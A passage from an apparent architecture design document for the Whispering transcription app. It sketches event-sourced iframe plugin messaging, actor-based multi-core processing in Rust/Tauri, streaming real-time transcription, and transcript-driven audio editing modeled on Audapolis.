└─────────────────────────────────────────────────────────────────────────┘
```

---

## Functional Core / Imperative Shell + Event Sourcing

### The Problem with Tier 2 (iframe) Plugins

Current challenge with ad-hoc postMessage:

```
┌─────────────────────────────────────────────────────────────────────────┐
│  PROBLEMS WITH AD-HOC postMessage                                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  • No type safety across iframe boundary                                │
│  • Imperative request/response is hard to test                          │
│  • State sync is manual and error-prone                                 │
│  • Race conditions on rapid updates                                     │
│  • Plugin must understand internal data shapes                          │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Functional Core / Imperative Shell Pattern

```
┌─────────────────────────────────────────────────────────────────────────┐
│                                                                          │
│  IMPERATIVE SHELL (thin)                                                │
│  • I/O: postMessage, fetch, Tauri commands                              │
│  • Side effects: clipboard, notifications, audio                        │
│  • Interprets commands from core                                        │
│                                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  FUNCTIONAL CORE (pure)                                         │   │
│  │  • State transitions: (State, Event) → State                    │   │
│  │  • Command generation: (State, Intent) → Command[]              │   │
│  │  • Queries: (State) → View                                      │   │
│  │  • No side effects, fully testable                              │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Applied to Whispering

```typescript
// FUNCTIONAL CORE - Pure functions, no I/O

type WhisperingState = {
	recordings: Recording[];
	transformations: Transformation[];
	activeRecording: RecordingSession | null;
	settings: Settings;
};

// Events (things that happened)
type WhisperingEvent =
	| { type: 'recording.started'; deviceId: string; timestamp: number }
	| { type: 'recording.stopped'; audioBlob: Blob; duration: number }
	| { type: 'transcription.completed'; recordingId: string; text: string }
	| { type: 'recording.deleted'; recordingId: string };

// Pure reducer
function reduce(
	state: WhisperingState,
	event: WhisperingEvent,
): WhisperingState {
	switch (event.type) {
		case 'transcription.completed':
			return {
				...state,
				recordings: state.recordings.map((r) =>
					r.id === event.recordingId ? { ...r, transcript: event.text } : r,
				),
			};
		// ... etc
	}
}
```

### Event Sourcing for Plugin Communication

Instead of plugins requesting data and getting responses, **plugins subscribe to an event stream**:

```
┌─────────────────────────────────────────────────────────────────────────┐
│  EVENT-SOURCED PLUGIN ARCHITECTURE                                       │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Host (Whispering Core)                                                 │
│  ─────────────────────                                                  │
│  Event Log: [e1, e2, e3, e4, e5, ...]                                   │
│                    │                                                     │
│                    │ postMessage (events only)                          │
│                    ▼                                                     │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  iframe (Plugin)                                                 │   │
│  │                                                                   │   │
│  │  // Plugin maintains its own state from events                   │   │
│  │  window.onmessage = ({ data: event }) => {                       │   │
│  │    state = reducer(state, event);                                │   │
│  │    render(state);                                                │   │
│  │  };                                                              │   │
│  │                                                                   │   │
│  │  // To take action, plugin sends intents                         │   │
│  │  parent.postMessage({ intent: 'deleteRecording', id: '123' });   │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Benefits for Tier 2 Plugins

| Benefit         | How It Helps                                 |
| --------------- | -------------------------------------------- |
| **Type safety** | Events are a defined contract                |
| **Testability** | Replay events to test plugin state           |
| **Time travel** | Plugin can request historical events on load |
| **Consistency** | All plugins see same events in same order    |
| **Decoupling**  | Plugins don't know about internal services   |
| **Debugging**   | Event log is complete audit trail            |

### Bidirectional Communication Protocol

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    HYBRID COMMUNICATION MODEL                            │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  DOWNSTREAM (Host → Plugin)                                             │
│  ══════════════════════════                                             │
│  1. Events (push)       - State changes, filtered by capability         │
│  2. Snapshots (push)    - Initial state on plugin load                  │
│  3. Acks (response)     - Intent accepted/rejected                      │
│  4. Query responses     - Data requested by plugin                      │
│                                                                          │
│  UPSTREAM (Plugin → Host)                                               │
│  ════════════════════════                                               │
│  1. Intents             - "I want X to happen" (validated by host)      │
│  2. Queries             - "Give me data matching X" (read-only)         │
│  3. Subscriptions       - "I want to hear about X" (filter events)      │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Message Types

```typescript
// HOST → PLUGIN
type HostToPluginMessage =
	| { type: 'snapshot'; state: PluginVisibleState }
	| { type: 'event'; event: WhisperingEvent }
	| {
			type: 'ack';
			correlationId: string;
			status: 'accepted' | 'rejected';
			error?: string;
	  }
	| { type: 'queryResponse'; correlationId: string; data: unknown };

// PLUGIN → HOST
type PluginToHostMessage =
	| { type: 'intent'; correlationId: string; intent: WhisperingIntent }
	| { type: 'query'; correlationId: string; query: WhisperingQuery }
	| { type: 'subscribe'; topics: string[] }
	| { type: 'ready' };
```

### Intent Types (Plugin wants to DO something)

```typescript
type WhisperingIntent =
	| { type: 'recording.delete'; id: string }
	| { type: 'recording.rename'; id: string; title: string }
	| { type: 'recording.retranscribe'; id: string; service?: string }
	| { type: 'playback.start'; recordingId: string }
	| { type: 'playback.stop' }
	| { type: 'clipboard.write'; text: string }
	| { type: 'navigate'; path: string };
```

### Query Types (Plugin wants to READ something)

```typescript
type WhisperingQuery =
	| { type: 'recordings.list'; filter?: RecordingFilter; limit?: number }
	| { type: 'recordings.search'; query: string; limit?: number }
	| { type: 'transformations.list' }
	| { type: 'settings.get'; keys: string[] };
```

### Security with Event Sourcing

```
┌─────────────────────────────────────────────────────────────────────────┐
│  SECURITY MODEL                                                          │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Events (Host → Plugin)                                                 │
│  • Host FILTERS events based on plugin capabilities                     │
│  • Plugin with 'recordings:read' gets recording events                  │
│  • Plugin without 'settings:read' never sees settings events            │
│                                                                          │
│  Intents (Plugin → Host)                                                │
│  • Host VALIDATES capability before executing                           │
│  • Host VALIDATES intent data (is recording ID real?)                   │
│  • Plugin NEVER executes directly                                       │
│                                                                          │
│  Result: Plugin is purely reactive                                      │
│  • Receives filtered event stream                                       │
│  • Can only request actions via validated intents                       │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### YJS Integration

YJS is already event-sourced under the hood:

```typescript
// Host bridges YJS updates to plugin events
workspace.recordings.observe((event) => {
	for (const change of event.changes.added) {
		sendToPlugin({ type: 'recording.created', recording: change });
	}
	for (const change of event.changes.deleted) {
		sendToPlugin({ type: 'recording.deleted', id: change.id });
	}
});
```

### Plugin SDK

```typescript
// @whispering/plugin-sdk

class WhisperingBridge {
  constructor(reducer: (state: State, event: Event) => State) {
    window.addEventListener('message', (e) => {
      if (e.data.type === 'event') {
        this.state = reducer(this.state, e.data.event);
        this.notify();
      }
    });
  }

  // Send intent (fire and wait for ack)
  async sendIntent(intent: WhisperingIntent): Promise<void> {
    const correlationId = crypto.randomUUID();
    parent.postMessage({ type: 'intent', correlationId, intent }, '*');
    return this.waitForAck(correlationId);
  }

  // Query data (request/response)
  async query<T>(query: WhisperingQuery): Promise<T> {
    const correlationId = crypto.randomUUID();
    parent.postMessage({ type: 'query', correlationId, query }, '*');
    return this.waitForResponse(correlationId);
  }

  // Subscribe to state changes
  subscribe(fn: (state: State) => void): () => void { ... }
}
```

### Communication Patterns Summary

| Direction         | Mechanism  | Use Case      | Response             |
| ----------------- | ---------- | ------------- | -------------------- |
| **Host → Plugin** | Event push | State changes | N/A                  |
| **Host → Plugin** | Snapshot   | Initial load  | N/A                  |
| **Plugin → Host** | Intent     | Modify state  | Ack + eventual event |
| **Plugin → Host** | Query      | Read data     | Query response       |

---

## Actor Model for Multi-Core Parallelism

### Relationship to Functional Core / Imperative Shell

FC/IS and Actor Model are **complementary patterns** that work at different scopes:

| Concept              | Scope              | Purpose                |
| -------------------- | ------------------ | ---------------------- |
| **Functional Core**  | Within a component | Testable state logic   |
| **Imperative Shell** | Within a component | I/O and side effects   |
| **Actor Model**      | Between components | Multi-core parallelism |

You can (and often should) use both:

- Each **actor** has its own **functional core** for state
- The **imperative shell** handles message passing between actors

### What Is the Actor Model?

The Actor Model (Erlang/Elixir OTP, Akka, Actix) uses independent "actors" running on separate cores, communicating only via message passing:

```
┌──────────┐    ┌──────────┐    ┌──────────┐
│  Actor A │───▶│  Actor B │───▶│  Actor C │
│  (Core 1)│◀───│  (Core 2)│◀───│  (Core 3)│
└──────────┘    └──────────┘    └──────────┘
     │               │               │
     └───────────────┴───────────────┘
              Message Passing
```

Key properties:

- **Isolation**: Each actor has private state, no shared memory
- **Message passing**: Communication only via async messages
- **Concurrency**: Actors run in parallel on different cores
- **Fault tolerance**: Actor crashes don't bring down the system

### Whispering Actor Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        Whispering App                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────┐   AudioChunk    ┌─────────────────┐            │
│  │   Recorder  │ ───────────────▶│   Transcriber   │            │
│  │    Actor    │                 │      Actor      │            │
│  │  (Core 1)   │                 │    (Core 2)     │            │
│  │             │                 │                 │            │
│  │ - CPAL mic  │                 │ - Whisper.cpp   │            │
│  │ - VAD       │                 │ - GPU/CPU bound │            │
│  └─────────────┘                 └────────┬────────┘            │
│        │                                  │                     │
│        │ RecordingState                   │ Transcript          │
│        ▼                                  ▼                     │
│  ┌─────────────────────────────────────────────────────┐        │
│  │                  Coordinator Actor                   │        │
│  │                      (Core 3)                        │        │
│  │                                                      │        │
│  │  - Orchestrates workflow                             │        │
│  │  - Maintains app state (Functional Core here!)       │        │
│  │  - Routes messages between actors                    │        │
│  └──────────────────────┬──────────────────────────────┘        │
│                         │                                       │
│         ┌───────────────┼───────────────┐                       │
│         │               │               │                       │
│         ▼               ▼               ▼                       │
│  ┌────────────┐  ┌────────────┐  ┌────────────┐                 │
│  │ Transformer│  │  Clipboard │  │    UI      │                 │
│  │   Actor    │  │   Actor    │  │   Actor    │                 │
│  │  (Core 4)  │  │  (Main)    │  │  (Main)    │                 │
│  │            │  │            │  │            │                 │
│  │ - LLM call │  │ - Paste    │  │ - Svelte   │                 │
│  │ - Groq API │  │ - Type     │  │ - Render   │                 │
│  └────────────┘  └────────────┘  └────────────┘                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Message Types for Actors

```typescript
// Messages (Events) that flow between actors
type WhisperingActorMessage =
	| { type: 'START_RECORDING' }
	| { type: 'AUDIO_CHUNK'; data: Float32Array }
	| { type: 'STOP_RECORDING' }
	| { type: 'TRANSCRIPT_READY'; text: string; confidence: number }
	| { type: 'TRANSFORM_TEXT'; text: string; transformation: string }
	| { type: 'TRANSFORMED'; original: string; result: string }
	| { type: 'COPY_TO_CLIPBOARD'; text: string }
	| { type: 'STATE_UPDATED'; state: WhisperingState };
```

### Coordinator's Functional Core

The Coordinator actor uses a pure reducer internally (FC/IS pattern):

```typescript
// Pure reducer inside Coordinator actor
function coordinatorReducer(
	state: WhisperingState,
	msg: WhisperingActorMessage,
): [WhisperingState, WhisperingActorMessage[]] {
	switch (msg.type) {
		case 'START_RECORDING':
			return [
				{ ...state, status: 'recording' },
				[], // No outgoing messages yet
			];

		case 'TRANSCRIPT_READY':
			const newState = {
				...state,
				status: 'transforming',
				currentTranscript: msg.text,
			};
			// Decide what to do next based on settings
			const outgoing: WhisperingActorMessage[] = state.settings.autoTransform
				? [
						{
							type: 'TRANSFORM_TEXT',
							text: msg.text,
							transformation: state.settings.defaultTransformation,
						},
					]
				: [{ type: 'COPY_TO_CLIPBOARD', text: msg.text }];

			return [newState, outgoing];

		case 'TRANSFORMED':
			return [
				{ ...state, status: 'idle', lastResult: msg.result },
				[{ type: 'COPY_TO_CLIPBOARD', text: msg.result }],
			];

		default:
			return [state, []];
	}
}
```

### Rust/Tauri Implementation

In Tauri, actors can be implemented with **Tokio tasks** or **threads**:

```rust
use tokio::sync::mpsc;

struct RecorderActor {
    output: mpsc::Sender<WhisperingMessage>,
}

impl RecorderActor {
    async fn run(mut self, mut input: mpsc::Receiver<WhisperingMessage>) {
        while let Some(msg) = input.recv().await {
            match msg {
                WhisperingMessage::StartRecording => {
                    // Start CPAL stream on this thread
                    // Send AudioChunks to Transcriber
                }
                WhisperingMessage::StopRecording => {
                    // Stop and notify coordinator
                }
                _ => {}
            }
        }
    }
}

struct TranscriberActor {
    output: mpsc::Sender<WhisperingMessage>,
    whisper: WhisperContext,  // CPU-bound, benefits from dedicated core
}

impl TranscriberActor {
    async fn run(mut self, mut input: mpsc::Receiver<WhisperingMessage>) {
        while let Some(msg) = input.recv().await {
            match msg {
                WhisperingMessage::AudioChunk { data } => {
                    // Run whisper inference (CPU-heavy)
                    let transcript = self.whisper.transcribe(&data);
                    self.output.send(WhisperingMessage::TranscriptReady {
                        text: transcript
                    }).await;
                }
                _ => {}
            }
        }
    }
}
```

### Multi-Core Benefits for Whispering

| Actor           | Work Type   | Core Benefit                            |
| --------------- | ----------- | --------------------------------------- |
| **Recorder**    | Real-time   | Dedicated thread = no audio dropouts    |
| **Transcriber** | CPU-heavy   | Whisper inference doesn't block UI      |
| **Transformer** | Network I/O | LLM calls run parallel to other work    |
| **Coordinator** | Light       | Event routing, state management         |
| **UI**          | Main thread | Responsive even during heavy processing |

### Video Editor Example (Multi-Core Intensive)

A video editor more clearly demonstrates multi-core actors:

```
┌─────────────────────────────────────────────────────────────────┐
│                      Video Editor App                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐              │
│  │   Decoder   │  │   Decoder   │  │   Decoder   │              │
│  │   Actor 1   │  │   Actor 2   │  │   Actor 3   │              │
│  │  (Core 1)   │  │  (Core 2)   │  │  (Core 3)   │              │
│  │             │  │             │  │             │              │
│  │ Track 1     │  │ Track 2     │  │ Audio       │              │
│  │ (4K video)  │  │ (overlay)   │  │ (48kHz)     │              │
│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘              │
│         │                │                │                     │
│         └────────────────┼────────────────┘                     │
│                          ▼                                      │
│                 ┌─────────────────┐                             │
│                 │    Compositor   │                             │
│                 │      Actor      │                             │
│                 │    (Core 4)     │                             │
│                 │                 │                             │
│                 │ - Blend layers  │                             │
│                 │ - Apply effects │                             │
│                 └────────┬────────┘                             │
│                          │                                      │
│         ┌────────────────┼────────────────┐                     │
│         ▼                ▼                ▼                     │
│  ┌────────────┐  ┌────────────┐  ┌────────────┐                 │
│  │  Preview   │  │   Export   │  │  Waveform  │                 │
│  │   Actor    │  │   Actor    │  │   Actor    │                 │
│  │  (Core 5)  │  │  (Core 6)  │  │  (Core 7)  │                 │
│  │            │  │            │  │            │                 │
│  │ - 30fps    │  │ - H.264    │  │ - FFT      │                 │
│  │ - Realtime │  │ - Encoding │  │ - Draw     │                 │
│  └────────────┘  └────────────┘  └────────────┘                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### When to Use Actors vs Simple Async

| Use Actors When                        | Use Simple Async When            |
| -------------------------------------- | -------------------------------- |
| CPU-bound work (Whisper, video decode) | I/O-bound work (HTTP, file read) |
| Strict isolation needed                | Shared state is acceptable       |
| Real-time constraints (audio capture)  | Latency tolerance is high        |
| Fault isolation needed                 | Failure handling is simple       |
| Clear data flow between components     | Components are tightly coupled   |

### Actor Libraries for Tauri

| Library     | Language | Notes                                  |
| ----------- | -------- | -------------------------------------- |
| **Actix**   | Rust     | Mature, high performance               |
| **Tokio**   | Rust     | Tasks + mpsc channels (lightweight)    |
| **xtra**    | Rust     | Simple, async-native actors            |
| **ractor**  | Rust     | Erlang-style supervision               |
| **Comlink** | JS       | Web Workers as actors (for UI plugins) |

### Combining FC/IS + Actors + Plugins

The full architecture combines all three patterns:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    WHISPERING FULL ARCHITECTURE                          │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ACTORS (Multi-Core)                                                    │
│  ───────────────────                                                    │
│  Each actor runs on its own thread/core:                                │
│  • Recorder Actor → Transcriber Actor → Coordinator Actor               │
│                                                                          │
│  FUNCTIONAL CORE (Within Each Actor)                                    │
│  ───────────────────────────────────                                    │
│  Each actor has a pure reducer:                                         │
│  • state' = reducer(state, message)                                     │
│  • Commands generated, shell executes                                   │
│                                                                          │
│  PLUGINS (Extension Points)                                             │
│  ─────────────────────────                                              │
│  Plugins extend actors via sandboxed boundaries:                        │
│  • Tier 1 (Wasm): Transcriber Actor loads plugin transcription services │
│  • Tier 2 (iframe): UI Actor embeds plugin pages                        │
│  • Tier 3 (Native): Recorder Actor uses signed CPAL plugin              │
│                                                                          │
│  EVENT SOURCING (Communication)                                         │
│  ─────────────────────────────                                          │
│  All communication is via typed events:                                 │
│  • Actor → Actor: WhisperingActorMessage                                │
│  • Host → Plugin: WhisperingEvent                                       │
│  • Plugin → Host: WhisperingIntent                                      │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Real-Time Transcription Support

### Current vs Real-Time Architecture

The current architecture uses a **batch model**:

```
Record (capture ALL audio) → Stop → Transcribe (entire blob) → Transform → Deliver
         │                                    │
         └──── minutes of audio ──────────────┘
                    ONE blob, ONE API call
```

Real-time transcription uses a **streaming model**:

```
Record ──chunk──► Transcribe ──partial──► UI (live text)
       ──chunk──► Transcribe ──partial──► UI
       ──chunk──► Transcribe ──partial──► UI
       ──chunk──► Transcribe ──final────► Transform → Deliver
```

### Impact on Actor Architecture

The actor boundaries **don't change** - you still have the same actors. What changes is:

| Aspect                | Batch            | Real-Time           |
| --------------------- | ---------------- | ------------------- |
| **Message frequency** | 1 message (blob) | N messages (chunks) |
| **Transcriber state** | Stateless        | Stateful (context)  |
| **UI updates**        | Once at end      | Continuous          |
| **Transform/Deliver** | After transcribe | After FINAL only    |

### Message Protocol for Real-Time

```typescript
// ═══════════════════════════════════════════════════════════════════
// RECORDER → TRANSCRIBER
// ═══════════════════════════════════════════════════════════════════

/** Continuous: Sent every TIMESLICE_MS while recording */
type AudioChunk = {
	type: 'AUDIO_CHUNK';
	sessionId: string;
	chunkIndex: number;
	timestamp: number;
	data: Blob;
	cumulativeDuration: number;
};

/** Once: Sent when user stops recording */
type RecordingStopped = {
	type: 'RECORDING_STOPPED';
	sessionId: string;
	totalChunks: number;
	totalDuration: number;
	finalBlob: Blob;
};

// ═══════════════════════════════════════════════════════════════════
// TRANSCRIBER → UI, COORDINATOR
// ═══════════════════════════════════════════════════════════════════

/** Continuous: Sent as transcription progresses */
type TranscriptPartial = {
	type: 'TRANSCRIPT_PARTIAL';
	sessionId: string;
	chunkIndex: number;
	text: string; // Full transcript so far
	confidence: number;
	isFinal: false;
};

/** Once: Sent when transcription is complete */
type TranscriptFinal = {
	type: 'TRANSCRIPT_FINAL';
	sessionId: string;
	text: string;
	confidence: number;
	segments?: TranscriptSegment[];
};

// ═══════════════════════════════════════════════════════════════════
// COORDINATOR ROUTING LOGIC
// ═══════════════════════════════════════════════════════════════════

// TRANSCRIPT_PARTIAL → Forward to UI only (don't act on partials)
// TRANSCRIPT_FINAL   → Forward to UI, then route to Transformer OR Delivery
```

### Transcriber Actor State Machine

```typescript
type TranscriberState =
  | { status: 'idle' }
  | { status: 'streaming'; session: StreamingSession }
  | { status: 'finalizing'; session: StreamingSession };

type StreamingSession = {
  sessionId: string;
  provider: TranscriptionProvider;
  connection: WebSocket | null;     // For streaming providers
  context: TranscriptionContext;    // Provider-specific state
  chunks: Map<number, Blob>;        // Buffer for out-of-order
  partialText: string;
};

// The Transcriber handles both batch and streaming providers:
handle(msg: AudioChunk) {
  if (this.provider.supportsStreaming) {
    // Send chunk immediately, emit partial when response arrives
    this.connection.send(msg.data);
  } else {
    // Buffer chunk, wait for RECORDING_STOPPED
    this.buffer.push(msg.data);
  }
}

handle(msg: RecordingStopped) {
  if (this.provider.supportsStreaming) {
    // Close WebSocket, wait for final from provider
    this.connection.close();
  } else {
    // Now send entire blob to batch API
    const blob = new Blob(this.buffer);
    const text = await this.provider.transcribe(blob);
    emit({ type: 'TRANSCRIPT_FINAL', text });
  }
}
```

### Batch vs Streaming: Same Protocol, Different Timing

The protocol supports both modes - batch is just streaming with buffered chunks:

```
STREAMING MODE (Deepgram, AssemblyAI):
AUDIO_CHUNK (0) → PARTIAL ("Hello")
AUDIO_CHUNK (1) → PARTIAL ("Hello, my")
AUDIO_CHUNK (2) → PARTIAL ("Hello, my name")
RECORDING_STOPPED → FINAL ("Hello, my name is Claude")

BATCH MODE (OpenAI, Groq):
AUDIO_CHUNK (0) → (buffered, no response)
AUDIO_CHUNK (1) → (buffered, no response)
AUDIO_CHUNK (2) → (buffered, no response)
RECORDING_STOPPED → FINAL ("Hello, my name is Claude")
```

### Streaming Transcription Providers

| Provider          | Streaming       | Protocol       |
| ----------------- | --------------- | -------------- |
| **OpenAI**        | No              | REST           |
| **Groq**          | No              | REST           |
| **Deepgram**      | **Yes**         | WebSocket      |
| **AssemblyAI**    | **Yes**         | WebSocket      |
| **Google Speech** | **Yes**         | gRPC/WebSocket |
| **Azure Speech**  | **Yes**         | WebSocket      |
| **Whisper.cpp**   | **Yes** (local) | Direct         |

### UI Integration for Live Transcription

```svelte
<script lang="ts">
	import { coordinatorState } from '$lib/actors/coordinator';

	let partialTranscript = $derived($coordinatorState.partialTranscript);
	let isTranscribing = $derived($coordinatorState.status === 'transcribing');
</script>

{#if isTranscribing}
	<div class="live-transcript">
		<p>
			{partialTranscript}
			<span class="cursor blink">|</span>
		</p>
	</div>
{/if}
```

### Minimal Changes Required

The actor model makes real-time transcription **easier** because:

1. **Actors naturally handle message streams** - no architectural change
2. **State is already encapsulated** - Transcriber just tracks context
3. **Message routing is explicit** - Coordinator decides when to trigger Transform
4. **UI is already reactive** - just subscribe to partials

Changes needed:

1. Add `onChunk` callback to Recorder (~5 lines)
2. Make Transcriber stateful (track context between chunks)
3. Add streaming provider implementations (Deepgram, etc.)
4. Add `partialTranscript` to UI state

---

## Text-Based Media Editing

### Overview

Text-based media editing allows users to edit audio/video by editing the transcript text. Delete a word from the transcript, and the corresponding audio is cut. This is the core innovation behind tools like Descript.

**Reference Implementation:** [Audapolis](https://github.com/bugbakery/audapolis) - an open-source Electron app that implements this pattern. Our analysis of Audapolis informs this design.

### Core Insight: Source References

The key architectural insight is that **the transcript IS the edit list**. Each word in the transcript stores a reference to its position in the original source media:

```typescript
// Each word points back to its location in the source audio
interface TextItem {
	type: 'text';
	uuid: string;
	source: string; // Hash of source media file
	sourceStart: number; // Start time in source (seconds)
	length: number; // Duration in source (seconds)
	text: string; // The transcribed word
	conf: number; // Confidence score (0-1)
}
```

**When you delete text, you're removing the reference, not the audio:**

```
Original: "Hello my um name is Claude"
          ─────────────────────────────
Source:   [0.0-0.3][0.3-0.5][0.5-0.7][0.7-1.0][1.0-1.2][1.2-1.6]

User deletes "um":
Edited:   "Hello my name is Claude"
          ────────────────────────────
Source:   [0.0-0.3][0.3-0.5][0.7-1.0][1.0-1.2][1.2-1.6]
                           ↑
                    Gap where "um" was (not played)
```

### Document Model

Following Audapolis's proven pattern, we use a **flat array with markers** rather than nested paragraphs:

```typescript
// Document item types
type DocumentItem =
	| ParagraphStartItem
	| ParagraphEndItem
	| TextItem
	| NonTextItem
	| ArtificialSilenceItem
	| GeneratedTextItem; // For AI voice synthesis (see Section 17)

interface ParagraphStartItem {
	type: 'paragraph_start';
	uuid: string;
	speaker: string;
	language: string | null;
}

interface ParagraphEndItem {
	type: 'paragraph_end';
	uuid: string;
}

interface TextItem {
	type: 'text';
	uuid: string;
	source: string; // Source media hash
	sourceStart: number; // Position in source
	length: number; // Duration
	text: string; // Transcribed word
	conf: number; // Confidence
}

interface NonTextItem {
	type: 'non_text';
	uuid: string;
	source: string;
	sourceStart: number;
	length: number;
	// Represents silence, breathing, background noise, etc.
}

interface ArtificialSilenceItem {
	type: 'artificial_silence';
	uuid: string;
	length: number;
	// User-inserted pause (no source reference)
}
```

**Why flat array instead of nested paragraphs?**

| Aspect          | Nested Structure       | Flat Array (Audapolis) |
| --------------- | ---------------------- | ---------------------- |
| Selection       | Complex tree traversal | Simple array indices   |
| Cut/Copy/Paste  | Tree manipulation      | Array splice           |
| Cursor position | Path through tree      | Single index           |
| Undo/Redo       | Complex diff           | Array snapshots        |
| Implementation  | ~2x complexity         | Straightforward        |

### Example Document

```typescript
const document: EditableDocument = {
	content: [
		{ type: 'paragraph_start', speaker: 'Alice', language: 'en', uuid: 'p1' },
		{
			type: 'text',
			source: 'abc123',
			sourceStart: 0.0,
			length: 0.3,
			text: 'Hello',
			conf: 0.98,
			uuid: 'w1',
		},
		{
			type: 'text',
			source: 'abc123',
			sourceStart: 0.3,
			length: 0.2,
			text: 'my',
			conf: 0.95,
			uuid: 'w2',
		},
		{
			type: 'non_text',
			source: 'abc123',
			sourceStart: 0.5,
			length: 0.2,
			uuid: 'n1',
		}, // breathing
		{
			type: 'text',
			source: 'abc123',
			sourceStart: 0.7,
			length: 0.3,
			text: 'name',
			conf: 0.97,
			uuid: 'w3',
		},
		{
			type: 'text',
			source: 'abc123',
			sourceStart: 1.0,
			length: 0.2,
			text: 'is',
			conf: 0.99,
			uuid: 'w4',
		},
		{
			type: 'text',
			source: 'abc123',
			sourceStart: 1.2,
			length: 0.4,
			text: 'Alice',
			conf: 0.96,
			uuid: 'w5',
		},
		{ type: 'paragraph_end', uuid: 'p1e' },
	],
	sources: {
		abc123: { blob: Blob, objectUrl: 'blob:...' },
	},
	metadata: {
		displaySpeakerNames: true,
		displayVideo: false,
	},
};
```

### Computed Timing (Not Stored)

Absolute times are **computed on-demand**, not stored in the document:

```typescript
interface TimedDocumentItem extends DocumentItem {
	absoluteStart: number; // Computed: position in edited timeline
	absoluteIndex: number; // Computed: index in array
}

function computeTimedItems(content: DocumentItem[]): TimedDocumentItem[] {
	let absoluteTime = 0;
	return content.map((item, idx) => {
		const timed = { ...item, absoluteStart: absoluteTime, absoluteIndex: idx };
		if ('length' in item) {
			absoluteTime += item.length;
		}
		return timed;
	});
}
```

**Benefits:**

- Edits don't require updating timestamps
- No timestamp inconsistency bugs
- Simpler undo/redo (just restore array)

### RenderItems: The Edit Decision List

For playback and export, the document is converted to **RenderItems**:

```typescript
type RenderItem =
	| {
			type: 'media';
			source: string;
			sourceStart: number;
			length: number;
			absoluteStart: number;
			speaker: string | null;
	  }
	| { type: 'silence'; length: number; absoluteStart: number };

function computeRenderItems(content: DocumentItem[]): RenderItem[] {
	const items: RenderItem[] = [];
	let currentTime = 0;
	let currentSpeaker: string | null = null;
	let current: RenderItem | null = null;

	for (const item of content) {
		if (item.type === 'paragraph_start') {
			currentSpeaker = item.speaker;
		} else if (item.type === 'paragraph_end') {
			// Finalize current render item
			if (current) {
				items.push(current);
				current = null;
			}
		} else if (item.type === 'text' || item.type === 'non_text') {
			// Check if we can merge with previous (consecutive in source)
			if (
				current?.type === 'media' &&
				current.source === item.source &&
				Math.abs(current.sourceStart + current.length - item.sourceStart) < 0.01
			) {
				// Merge: extend current item
				current.length += item.length;
			} else {
				// Start new render item
				if (current) items.push(current);
				current = {
					type: 'media',
					source: item.source,
					sourceStart: item.sourceStart,
					length: item.length,
					absoluteStart: currentTime,
					speaker: currentSpeaker,
				};
			}
			currentTime += item.length;
		} else if (item.type === 'artificial_silence') {
			if (current) {
				items.push(current);
				current = null;
			}
			items.push({
				type: 'silence',
				length: item.length,
				absoluteStart: currentTime,
			});
			currentTime += item.length;
		}
	}

	if (current) items.push(current);
	return items;
}
```

**Merging optimization:** Consecutive words from the same source position become a single render item, reducing FFmpeg operations.

### Editor Actor

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    EDITOR ACTOR TOPOLOGY                                 │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Existing Actors:                                                        │
│  Recorder ──► Transcriber ──► Coordinator                               │
│                                   │                                      │
│                                   │ TRANSCRIPT_FINAL (with segments)     │
│                                   ▼                                      │
│                          ┌─────────────────┐                             │
│                          │  Editor Actor   │  ← NEW                      │
│                          │                 │                             │
│                          │ • Document state│                             │
│                          │ • Cursor/select │                             │
│                          │ • Undo stack    │                             │
│                          │ • Playback ctrl │                             │
│                          └────────┬────────┘                             │
│                                   │                                      │
│                    ┌──────────────┼──────────────┐                       │
│                    │              │              │                       │
│                    ▼              ▼              ▼                       │
│              ┌──────────┐  ┌──────────┐  ┌──────────┐                    │
│              │  Player  │  │  FFmpeg  │  │   UI     │                    │
│              │ (preview)│  │ (export) │  │ (render) │                    │
│              └──────────┘  └──────────┘  └──────────┘                    │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Editor Message Protocol

```typescript
// ═══════════════════════════════════════════════════════════════════
// DOCUMENT OPERATIONS
// ═══════════════════════════════════════════════════════════════════

type LoadDocument = {
	type: 'LOAD_DOCUMENT';
	document: EditableDocument;
};

type DocumentLoaded = {
	type: 'DOCUMENT_LOADED';
	document: EditableDocument;
	duration: number;
};

// ═══════════════════════════════════════════════════════════════════
// EDIT OPERATIONS
// ═══════════════════════════════════════════════════════════════════

type DeleteSelection = {
	type: 'DELETE_SELECTION';
	// Uses current selection state
};

type InsertParagraphBreak = {
	type: 'INSERT_PARAGRAPH_BREAK';
	atIndex: number;
};

type SetSpeaker = {
	type: 'SET_SPEAKER';
	paragraphUuid: string;
	speaker: string;
};

type InsertSilence = {
	type: 'INSERT_SILENCE';
	atIndex: number;
	duration: number;
};

// ═══════════════════════════════════════════════════════════════════
// SELECTION & CURSOR
// ═══════════════════════════════════════════════════════════════════

type SetCursor = {
	type: 'SET_CURSOR';
	index: number;
	source: 'user' | 'player';
};

type SetSelection = {
	type: 'SET_SELECTION';
	startIndex: number;
	length: number;
};

type ClearSelection = {
	type: 'CLEAR_SELECTION';
};

// ═══════════════════════════════════════════════════════════════════
// PLAYBACK
